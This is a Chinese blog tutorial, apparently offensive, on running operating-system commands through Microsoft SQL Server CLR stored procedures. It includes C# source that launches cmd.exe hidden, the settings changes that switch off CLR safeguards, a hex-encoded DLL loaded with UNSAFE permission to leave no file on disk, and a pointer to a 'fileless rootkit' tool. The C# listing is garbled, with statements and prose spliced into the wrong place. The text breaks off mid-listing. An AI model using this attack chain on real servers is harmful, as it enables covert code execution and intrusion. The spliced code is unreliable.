在利用MSSQL服务实现命令执行的时候，通常的做法是利用xp_cmdshell存储过程在MSSQL进程的上下文中运行操作系统命令。如果要想利用这种技术运行自定义代码，通常需要使用LOLBINS，添加新的操 作系统用户，或通过BCP向磁盘中写入二进制文件，这些方法的缺点是很容易被发现。CLR方式可以利用16进制文件流方式导入DLL文件，这样不需要文件落地。</p><h3 id="创建CLR"><a href="#创建CLR" class="headerlink" title="创建CLR"></a>创建CLR</h3><p>利用VS创建MSSQL数据库项目<br><img src="/images/image34.jpeg"></p><p>修改目标平台和勾选创建脚本<br><img src="/images/image35.jpeg"></p><p>在SQL Server 2005中引入了从MSSQL运行.NET代码的功能，并在后续版本中叠加了许多保护措施，来限制代码可以访问的内容。在创建.Net程序集时，会给它们指定一个权限级别，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE ASSEMBLY SQLCLRTest FROM &#39;C:\MyDBApp\SQLCLRTest.dll&#39; WITH PERMISSION_SET &#x3D; SAFE;</span><br></pre></td></tr></table></figure><p>其权限集有三个选项：<br>SAFE：基本上只将MSSQL数据集暴露给代码，其他大部分操作则都被禁止。<br>EXTERNAL_ACCESS：允许访问底层服务器上某些资源，但不应该允许直接执行代码。<br>UNSAFE：允许使用任何代码。<br>微软关于SQL CLR的详细文档可通过以下地址获得： <a href="https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration">https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration</a><br>修改目标框架和权限级别为UNSAFE。<br><img src="/images/image36.jpeg"></p><p>创建SQL CLR C# 存储过程</p><p><img src="/images/image37.jpeg"></p><p>写入代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Data;</span><br><span class="line">using System.Data.SqlClient;</span><br><span class="line">using System.Data.SqlTypes;</span><br><span class="line">using System.Diagnostics;</span><br><span class="line">using System.Text;</span><br><span class="line">using Microsoft.SqlServer.Server;</span><br><span class="line"> public partial class StoredProcedures</span><br><span class="line">&#123;</span><br><span class="line">    [Microsoft.SqlServer.Server.SqlProcedure]</span><br><span class="line">    public static void ExecCommand (string cmd)</span><br><span class="line">    &#123;</span><br><span class="line">&#x2F;&#x2F; 在此处放置代码</span><br><span class="line">SqlContext.Pipe.Send(&quot;Command is running, please wait.&quot;); SqlContext.Pipe.Send(RunCommand(&quot;cmd.exe&quot;, &quot; &#x2F;c &quot; + cmd));</span><br><span class="line">    &#125;</span><br><span class="line">    public static string RunCommand(string filename,string arguments)</span><br><span class="line">    &#123;</span><br><span class="line">        var process &#x3D; new Process();</span><br><span class="line">        process.StartInfo.FileName &#x3D; filename;</span><br><span class="line">        if (!string.IsNullOrEmpty(arguments))</span><br><span class="line">        &#123;</span><br><span class="line">            process.StartInfo.Arguments &#x3D; arguments;</span><br><span class="line">        &#125;</span><br><span class="line">        process.StartInfo.CreateNoWindow &#x3D; true;</span><br><span class="line">        process.StartInfo.WindowStyle &#x3D; ProcessWindowStyle.Hidden;</span><br><span class="line">        process.StartInfo.UseShellExecute &#x3D; false;</span><br><span class="line">        process.StartInfo.RedirectStandardError &#x3D; true;</span><br><span class="line">        process.StartInfo.RedirectStandardOutput &#x3D; true;</span><br><span class="line">        var stdOutput &#x3D; new StringBuilder();</span><br><span class="line">        process.OutputDataReceived +&#x3D; (sender, args) &#x3D;&gt;</span><br><span class="line">stdOutput.AppendLine(args.Data);</span><br><span class="line">        string stdError &#x3D; null;</span><br><span class="line">try &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        catch (Exception e)</span><br><span class="line">        &#123;</span><br><span class="line">            SqlContext.Pipe.Send(e.Message);</span><br><span class="line">        &#125;</span><br><span class="line">        if (process.ExitCode &#x3D;&#x3D; 0)</span><br><span class="line">        &#123;</span><br><span class="line">            SqlContext.Pipe.Send(stdOutput.ToString());</span><br><span class="line">        &#125;</span><br><span class="line">else &#123;</span><br><span class="line">            var message &#x3D; new StringBuilder();</span><br><span class="line">            if (!string.IsNullOrEmpty(stdError))</span><br><span class="line">            &#123;</span><br><span class="line">                message.AppendLine(stdError);</span><br><span class="line">            &#125;</span><br><span class="line">            if (stdOutput.Length !&#x3D; 0)</span><br><span class="line">            &#123;</span><br><span class="line">process.Start();</span><br><span class="line">process.BeginOutputReadLine();</span><br><span class="line">stdError &#x3D; process.StandardError.ReadToEnd();</span><br><span class="line">process.WaitForExit();</span><br><span class="line">message.AppendLine(&quot;Std output:&quot;);</span><br><span class="line"> </span><br><span class="line"> 编译生成DLL文件。</span><br><span class="line">运行权限级别为“SAFE”的代码，只需启用CLR就可以了;但是，要想运行权限级别为 “EXTERNAL_ACCESS”或“UNSAFE”的代码，则需要需要修改相应的配置，以及DBA权限。2017年之前和 之后的服务器版本，运行标记为“UNSAFE”的CLR所需步骤是不同的，下面分别进行介绍:</span><br><span class="line">对于SQL Server 2017之前的版本 显示高级选项:</span><br><span class="line"> </span><br><span class="line">sp_configure &#39;show advanced options&#39;,1;RECONFIGURE</span><br><span class="line"> 启用CLR:</span><br><span class="line">message.AppendLine(stdOutput.ToString());</span><br><span class="line">            &#125;</span><br><span class="line">            SqlContext.Pipe.Send(filename + arguments + &quot; finished with exit code</span><br><span class="line">&#x3D; &quot; + process.ExitCode + &quot;: &quot; + message);</span><br><span class="line">&#125;</span><br><span class="line">        return stdOutput.ToString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/image38.jpeg"></p><p>编译生成DLL文件。</p><p><img src="/images/image39.png"></p><p>运行权限级别为“SAFE”的代码，只需启用CLR就可以了;但是，要想运行权限级别为 “EXTERNAL_ACCESS”或“UNSAFE”的代码，则需要需要修改相应的配置，以及DBA权限。2017年之前和 之后的服务器版本，运行标记为“UNSAFE”的CLR所需步骤是不同的，下面分别进行介绍:</p><h4 id="对于SQL-Server-2017之前的版本"><a href="#对于SQL-Server-2017之前的版本" class="headerlink" title="对于SQL Server 2017之前的版本"></a>对于SQL Server 2017之前的版本</h4><p>显示高级选项：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sp_configure &#39;show advanced options&#39;,1;RECONFIGURE</span><br></pre></td></tr></table></figure><p><img src="/images/image40.png"><br>启用CLR：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sp_configure &#39;clr enabled&#39;,1;RECONFIGURE;</span><br></pre></td></tr></table></figure><p><img src="/images/image41.png"></p><p>将存储.Net程序集的数据库配置为可信赖的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER DATABASE master SET TRUSTWORTHY ON;</span><br></pre></td></tr></table></figure><p><img src="/images/image42.png"></p><h4 id="SQL-Server-2017及更高版本"><a href="#SQL-Server-2017及更高版本" class="headerlink" title="SQL Server 2017及更高版本"></a>SQL Server 2017及更高版本</h4><p>对于SQL Server 2017及更高版本，则引入了严格的安全性，也必须禁用。另外，也可以根据提供的 SHA512哈希值，针对单个程序集授予其UNSAFE权限，而不是将整个数据库都标记为可信的。对于SQL Server 2017及以上版本，如下所示:</p><p>显示高级选项：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sp_configure &#39;show advanced options&#39;,1;RECONFIGURE</span><br></pre></td></tr></table></figure><p>启用CLR：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sp_configure &#39;clr enabled&#39;,1;RECONFIGURE;</span><br></pre></td></tr></table></figure><p>将某程序集的SHA512哈希值添加到可信程序集列表中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sp_add_trusted_assembly @hash&#x3D; &lt;SHA512 of DLL&gt;;</span><br></pre></td></tr></table></figure><p>从现在开始，程序集的创建和调用对于任何SQL Server版本来说，都是一样的。通过十六进制字符串创建程序集——如果可以从十六进制字符串创建程序集，则意味着无需创建一个二 进制文件并将其写入SQL服务器进程可访问的位置:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE ASSEMBLY clrassem from &lt;HEX STRING&gt; WITH PERMISSION_SET &#x3D; UNSAFE;</span><br></pre></td></tr></table></figure><p>创建存储过程，以从程序集运行代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE PROCEDURE debugrun AS EXTERNAL NAME clrassem.StoredProcedures.runner;</span><br></pre></td></tr></table></figure><p>运行该存储过程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debugrun</span><br></pre></td></tr></table></figure><p>在代码运行后，可以删除存储过程、程序集以及受信任的哈希值，并将前面修改的安全设置恢复原值。<br>下面显示了一个完成该任务的SQL查询示例<br>对于SQL Server 2017及更高版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sp_drop_trusted_assembly @hash&#x3D;&lt;SHA512 of DLL&gt;</span><br></pre></td></tr></table></figure><p>对于SQL Server 2017之前的版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER DATABASE &lt;CONNECTED DATABASE&gt; SET TRUSTWORTHY OFF;</span><br></pre></td></tr></table></figure><p>对于所有版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DROP PROCEDURE debugrun;</span><br><span class="line">DROP ASSEMBLY clrassem;</span><br><span class="line">sp_configure &#39;clr strict security&#39;,1;RECONFIGURE</span><br><span class="line">sp_configure &#39;show advanced options&#39;,0;RECONFIGURE</span><br></pre></td></tr></table></figure><h3 id="利用SQL语句导入程序集"><a href="#利用SQL语句导入程序集" class="headerlink" title="利用SQL语句导入程序集"></a>利用SQL语句导入程序集</h3><p>现在可以利用16进制文件流方式导入DLL文件，这样不需要文件落地。</p><p><img src="/images/image39.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line">CREATE ASSEMBLY [Database1]</span><br><span class="line">AUTHORIZATION [dbo]</span><br><span class="line">FROM 0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000</span><br><span class="line">000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD2154</span><br><span class="line">6869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D</span><br><span class="line">0A2400000000000000504500004C0103006E587C5E0000000000000000E00022200B013000000E00</span><br><span class="line">000006000000000000522C0000002000000040000000000010002000000002000004000000000000</span><br><span class="line">00040000000000000000800000000200000000000003004085000010000010000000001000001000</span><br><span class="line">0000000000100000000000000000000000002C00004F00000000400000A802000000000000000000</span><br><span class="line">000000000000000000006000000C000000C82A00001C000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000002000000800000000000000000000</span><br><span class="line">00082000004800000000000000000000002E74657874000000580C000000200000000E0000000200</span><br><span class="line">00000000000000000000000000200000602E72737263000000A80200000040000000040000001000</span><br><span class="line">00000000000000000000000000400000402E72656C6F6300000C0000000060000000020000001400</span><br><span class="line">000000000000000000000000004000004200000000000000000000000000000000342C0000000000</span><br><span class="line">0048000000020005007C2200004C0800000100000000000000000000000000000000000000000000</span><br><span class="line">000000000000000000000000000000000000000000000000000000000000000000CA00280600000A</span><br><span class="line">72010000706F0700000A00280600000A7243000070725300007002280800000A28020000066F0700</span><br><span class="line">000A002A001B300600BC0100000100001173040000060A00730900000A0B076F0A00000A026F0B00</span><br><span class="line">000A0003280C00000A16FE010D092C0F00076F0A00000A036F0D00000A0000076F0A00000A176F0E</span><br><span class="line">00000A00076F0A00000A176F0F00000A00076F0A00000A166F1000000A00076F0A00000A176F1100</span><br><span class="line">000A00076F0A00000A176F1200000A0006731300000A7D010000040706FE0605000006731400000A</span><br><span class="line">6F1500000A00140C00076F1600000A26076F1700000A00076F1800000A6F1900000A0C076F1A0000</span><br><span class="line">0A0000DE18130400280600000A11046F1B00000A6F0700000A0000DE00076F1C00000A16FE011305</span><br><span class="line">11052C1D00280600000A067B010000046F1D00000A6F0700000A000038AA00000000731300000A13</span><br><span class="line">0608280C00000A16FE01130711072C0B001106086F1E00000A2600067B010000046F1F00000A16FE</span><br><span class="line">03130811082C22001106725D0000706F1E00000A261106067B010000046F1D00000A6F1E00000A26</span><br><span class="line">00280600000A1C8D0E000001251602A2251703A225187275000070A22519076F1C00000A13091209</span><br><span class="line">282000000AA2251A72AD000070A2251B1106252D0426142B056F1D00000AA2282100000A6F070000</span><br><span class="line">0A0000067B010000046F1D00000A130A2B00110A2A011000000000970025BC001808000001220228</span><br><span class="line">2200000A002A4E027B01000004046F2300000A6F1E00000A262A00000042534A4201000100000000</span><br><span class="line">000C00000076342E302E33303331390000000005006C000000A8020000237E000014030000B40300</span><br><span class="line">0023537472696E677300000000C8060000B4000000235553007C0700001000000023475549440000</span><br><span class="line">008C070000C000000023426C6F620000000000000002000001571502000902000000FA0133001600</span><br><span class="line">00010000001400000003000000010000000500000005000000230000000500000001000000010000</span><br><span class="line">0003000000010000000000D60101000000000006007001BA0206009001BA0206004601A7020F00DA</span><br><span class="line">02000006003C03E4010A005A015A020E001503A7020600EB01E40106002C027A0306002B01BA020E</span><br><span class="line">00FA02A7020A0086035A020A0023015A020600C401E4010E000302A7020E00D200A7020E004102A7</span><br><span class="line">0206001402400006002102400006003100E401000000003700000000000100010001001000E90200</span><br><span class="line">00150001000100030110000100000015000100040006007003790050200000000096008D007D0001</span><br><span class="line">00842000000000960099001A0002005C22000000008618A102060004005C22000000008618A10206</span><br><span class="line">0004006522000000008300160082000400000001007F0000000100F200000002002B03000001003A</span><br><span class="line">020000020010030900A10201001100A10206001900A1020A003100A10206005100A102060061001A</span><br><span class="line">0110006900A4001500710035031A003900A10206003900F50132007900E50015007100A403370079</span><br><span class="line">001D031500790091033C007900C20041007900AE013C00790087023C00790055033C004900A10206</span><br><span class="line">008900A1024700390068004D0039004F0353003900FB000600390075025700990083005C00390043</span><br><span class="line">0306004100B6005C003900A90060002900C2015C0049000F0164004900CB016000A100C2015C0071</span><br><span class="line">0035036A002900A1020600590056005C0020002300BA002E000B0089002E00130092002E001B00B1</span><br><span class="line">0063002B00BA00200004800000000000000000000000000000000027000000040000000000000000</span><br><span class="line">00000070005F000000000004000000000000000000000070004A0000000000040000000000000000</span><br><span class="line">0000007000E40100000000030002000000003C3E635F5F446973706C6179436C617373315F30003C</span><br><span class="line">52756E436F6D6D616E643E625F5F300044617461626173653100496E743332003C4D6F64756C653E</span><br><span class="line">0053797374656D2E494F0053797374656D2E44617461006765745F44617461006D73636F726C6962</span><br><span class="line">006164645F4F757470757444617461526563656976656400636D640052656164546F456E64004578</span><br><span class="line">6563436F6D6D616E640052756E436F6D6D616E640053656E64006765745F45786974436F64650067</span><br><span class="line">65745F4D657373616765007365745F57696E646F775374796C650050726F6365737357696E646F77</span><br><span class="line">5374796C65007365745F46696C654E616D650066696C656E616D6500426567696E4F757470757452</span><br><span class="line">6561644C696E6500417070656E644C696E65006765745F506970650053716C5069706500436F6D70</span><br><span class="line">696C657247656E6572617465644174747269627574650044656275676761626C6541747472696275</span><br><span class="line"> 74650053716C50726F63656475726541747472696275746500436F6D70696C6174696F6E52656C61</span><br><span class="line">786174696F6E734174747269627574650052756E74696D65436F6D7061746962696C697479417474</span><br><span class="line">726962757465007365745F5573655368656C6C4578656375746500546F537472696E67006765745F</span><br><span class="line">4C656E677468004461746162617365312E646C6C0053797374656D00457863657074696F6E006765</span><br><span class="line">745F5374617274496E666F0050726F636573735374617274496E666F0053747265616D5265616465</span><br><span class="line">72005465787452656164657200537472696E674275696C6465720073656E64657200446174615265</span><br><span class="line">6365697665644576656E7448616E646C6572004D6963726F736F66742E53716C5365727665722E53</span><br><span class="line">6572766572006765745F5374616E646172644572726F72007365745F52656469726563745374616E</span><br><span class="line">646172644572726F72002E63746F720053797374656D2E446961676E6F7374696373005379737465</span><br><span class="line">6D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465</span><br><span class="line">730053746F72656450726F63656475726573004461746152656365697665644576656E7441726773</span><br><span class="line">00617267730050726F63657373007365745F417267756D656E747300617267756D656E747300436F</span><br><span class="line">6E636174004F626A6563740057616974466F7245786974005374617274007365745F526564697265</span><br><span class="line">63745374616E646172644F7574707574007374644F75747075740053797374656D2E546578740053</span><br><span class="line">716C436F6E74657874007365745F4372656174654E6F57696E646F770049734E756C6C4F72456D70</span><br><span class="line">7479000000004143006F006D006D0061006E0064002000690073002000720075006E006E0069006E</span><br><span class="line">0067002C00200070006C006500610073006500200077006100690074002E00000F63006D0064002E</span><br><span class="line">00650078006500000920002F0063002000001753007400640020006F00750074007000750074003A</span><br><span class="line">0000372000660069006E006900730068006500640020007700690074006800200065007800690074</span><br><span class="line">00200063006F006400650020003D00200000053A0020000000593C457501949B4EAC85A8875A6084</span><br><span class="line">DC000420010108032000010520010111110400001235042001010E0500020E0E0E11070B120C121D</span><br><span class="line">0E0212210212250202080E042000123D040001020E0420010102052001011141052002011C180520</span><br><span class="line">010112450320000204200012490320000E0320000805200112250E0500010E1D0E08B77A5C561934</span><br><span class="line">E08903061225040001010E062002011C122D0801000800000000001E01000100540216577261704E</span><br><span class="line">6F6E457863657074696F6E5468726F777301080100070100000000040100000000000000006E587C</span><br><span class="line">5E00000000020000001C010000E42A0000E40C000052534453CEC8B2762812304EAEE7EF5EE4D9EC</span><br><span class="line">7901000000463A5C746F6F6C735F736F757263655C4461746162617365315C446174616261736531</span><br><span class="line">5C6F626A5C44656275675C4461746162617365312E70646200000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000282C00000000000000000000422C00</span><br><span class="line">00002000000000000000000000000000000000000000000000342C0000000000000000000000005F</span><br><span class="line">436F72446C6C4D61696E006D73636F7265652E646C6C0000000000FF250020001000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000010010000000180000</span><br><span class="line">80000000000000000000000000000001000100000030000080000000000000000000000000000001</span><br><span class="line">000000000048000000584000004C02000000000000000000004C0234000000560053005F00560045</span><br><span class="line">005200530049004F004E005F0049004E0046004F0000000000BD04EFFE0000010000000000000000</span><br><span class="line">0000000000000000003F000000000000000400000002000000000000000000000000000000440000</span><br><span class="line">000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061</span><br><span class="line">006E0073006C006100740069006F006E00000000000000B004AC010000010053007400720069006E</span><br><span class="line">006700460069006C00650049006E0066006F00000088010000010030003000300030003000340062</span><br><span class="line">00300000002C0002000100460069006C0065004400650073006300720069007000740069006F006E</span><br><span class="line">000000000020000000300008000100460069006C006500560065007200730069006F006E00000000</span><br><span class="line">0030002E0030002E0030002E00300000003C000E00010049006E007400650072006E0061006C004E</span><br><span class="line">0061006D00650000004400610074006100620061007300650031002E0064006C006C000000280002</span><br><span class="line">0001004C006500670061006C0043006F00700079007200690067006800740000002000000044000E</span><br><span class="line">0001004F0072006900670069006E0061006C00460069006C0065006E0061006D0065000000440061</span><br><span class="line">0074006100620061007300650031002E0064006C006C000000340008000100500072006F00640075</span><br><span class="line">0063007400560065007200730069006F006E00000030002E0030002E0030002E0030000000380008</span><br><span class="line">00010041007300730065006D0062006C0079002000560065007200730069006F006E00000030002E</span><br><span class="line">0030002E0030002E0030000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00002000000C000000543C0000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">    WITH PERMISSION_SET &#x3D; UNSAFE;</span><br><span class="line">GO</span><br></pre></td></tr></table></figure><p><img src="/images/image43.png"></p><p>创建存储过程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE PROCEDURE [dbo].[ExecCommand]</span><br><span class="line">@cmd NVARCHAR (MAX)</span><br><span class="line">AS EXTERNAL NAME [Database1].[StoredProcedures].[ExecCommand]</span><br><span class="line">go</span><br></pre></td></tr></table></figure><p><img src="/images/image44.png"></p><h3 id="利用CLR执行命令"><a href="#利用CLR执行命令" class="headerlink" title="利用CLR执行命令"></a>利用CLR执行命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec dbo.ExecCommand &quot;whoami &#x2F;all&quot;;</span><br></pre></td></tr></table></figure><p><img src="/images/image45.png"></p><h4 id="WarSQLKit"><a href="#WarSQLKit" class="headerlink" title="WarSQLKit"></a>WarSQLKit</h4><p>WarSQLKit是一个针对MSSQL CLR进行利用的工具，有以下两个版本。</p><ul><li>WarSQLKit是完全版本，内置多种功能。</li><li>WarSQLKit是完全版本，内置多种功能。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;EPICROUTERSS&#x2F;MSSQL-Fileless-Rootkit-WarSQLKit</span><br></pre></td></tr></table></figure><p>WarSQLKitMinimal是简化版，只能执行命令。</p><h3 id="导入WarSQLKit-DLL文件"><a href="#导入WarSQLKit-DLL文件" class="headerlink" title="导入WarSQLKit DLL文件"></a>导入WarSQLKit DLL文件</h3><p>利用16进制文件流方式导入WarSQLKit.dll文件。<br><img src="/images/image46.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE ASSEMBLY [WarSQLKit]</span><br><span class="line">    AUTHORIZATION [dbo]</span><br><span class="line">    FROM 0x4D5A......</span><br><span class="line">    WITH PERMISSION_SET &#x3D; UNSAFE;</span><br><span class="line">GO</span><br></pre></td></tr></table></figure><p><img src="/images/image47.png"><br>创建存储过程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 